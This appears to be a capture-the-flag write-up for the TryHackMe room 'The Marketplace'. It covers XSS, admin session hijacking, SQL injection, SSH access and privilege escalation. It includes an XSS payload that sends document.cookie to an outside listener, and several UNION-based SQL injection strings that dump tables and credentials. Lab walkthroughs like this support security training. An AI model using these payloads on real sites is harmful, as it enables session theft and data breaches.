# The Marketplace

![](https://tryhackme-images.s3.amazonaws.com/room-icons/7c385ae7e0ef53362b807fffe8b69a47.png)

---

## nmap

![](images/nmap.png)

## Sign Up & Login

![](images/signup.png)

## XSS

> Test `XSS` 

![](images/xss1.png)  

![](images/xss2.png)

## Steal admin token

> Make a `new listing`, change the `description` to the script, open a netcat listener and then `report` the listing to the admins
```JavaScript
<script>new Image().src="http://10.11.19.194:1337/cookie.php?output="+document.cookie;</script>
```

![](images/cookiesteal.png)
![](images/admintoken.png)

## Hijack admin account

> Edit the session token and change it to the `admins token` and refresh
> 
![](images/admin.png)

## Flag 1

> Flag 1 is in the `admin panel`

![](images/flag1.png)

## SQL Injection

> Produce an SQL error in the admin panel by changing the `user id` to `

![](images/sql.png)

>Capture the request and send it to the `repeater` in `BurpSuite`

![](images/burp.png)

> There are `4` columns. 5 gets an error
4 does not

![](images/4columns.png)

> Show the database `schema` 
```SQL
''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,schema_name,0x7C),2,3,4+fRoM+information_schema.schemata--
```
![](images/schema.png)

> Show the `tables` in the `marketplace` db
```SQL
''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,table_name,0x7c),2,3,4+fRoM+information_schema.tables+wHeRe+table_schema='marketplace'--
```
![](images/marketplacedb.png)

> Show the `columns` in the `messages` `table`
```SQL
''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,column_name,0x7C),2,3,4+fRoM++information_schema.columns+wHeRe+table_name='messages'
```

![](images/messagetable.png)

> User `1` sent user `3` a message with a new SSH password

```SQL
''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,':',user_to,':',user_from,':',message_content,0x7C,'\n\n'),2,3,4+fRoM+marketplace.messages
```

![](images/user3pass.png)

> Get the `id`s by dumping the `users` table, user `1` is `system` and user `3` is `jake`.
```SQL
''+UNION+ALL+SELECT+gRoUp_cOncaT(0x7c,id,':',username,':',password,0x7C,'\n'),2,3,4+fRoM+marketplace.users
```

![](images/ids.png)

## SSH

> SSH login as the `jake` user

![](images/ssh.png)

## User Flag

![](images/userf.png)

## PrivEsc

> `Michael` can run a shell file called `backup.sh` as sudo, exploit this to get the `michael` user.

![](images/sudo.png)

![](images/michael.png)

## Root

> `michael` is in the `docker` group. Exploit `docker` to escalate to root.

![](images/root.png)

## Root Flag

![](images/rootflag.png)
